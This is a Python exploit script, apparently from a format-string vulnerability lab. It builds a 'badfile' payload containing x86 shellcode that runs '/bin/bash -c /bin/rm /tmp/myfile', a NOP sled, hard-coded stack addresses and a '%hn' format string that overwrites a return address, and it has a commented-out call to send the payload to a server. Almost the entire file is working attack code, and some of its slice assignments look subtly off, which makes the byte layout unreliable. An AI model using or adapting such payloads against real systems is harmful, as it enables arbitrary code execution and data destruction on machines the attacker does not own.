#!/usr/bin/python3
import sys

shellcode = ("\x31\xc0"
             "\x50"
             "\x68"
             "bash"
             "\x68"
             "////"
             "\x68"
             "/bin"
             "\x89\xe3"
             "\x31\xc0"
             "\x50"
             "\x68"
             "-ccc"
             "\x89\xe0"
             "\x31\xd2"
             "\x52"
             "\x68"
             "ile "
             "\x68"
             "/myf"
             "\x68"
             "/tmp"
             "\x68"
             "/rm "
             "\x68"
             "/bin"
             "\x89\xe2"
             "\x31\xc9"
             "\x51"
             "\x52"
             "\x50"
             "\x53"
             "\x89\xe1"
             "\x31\xd2"
             "\x31\xc0"
             "\xb0\x0b"
             "\xcd\x80").encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(1500))

# Put the shellcode at the end
start = 1500 - len(shellcode)
content[start:] = shellcode
addr_low = 0xbffff08c
addr_high = 0xbffff08e
content[0:3] = (addr_high).to_bytes(4, byteorder='little')
content[4:7] = (addr_low).to_bytes(4, byteorder='little')

pre_num = 0xbfff - 8
after_diff = 0xf1a8 - 0xbfff

fmt = ("%." + str(pre_num) + "x%24hn" + "%." + str(after_diff) +
       "x%25hn").encode('latin-1')

content[8:len(fmt)] = fmt
# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()

# Send content to server
#send_to_server(content)
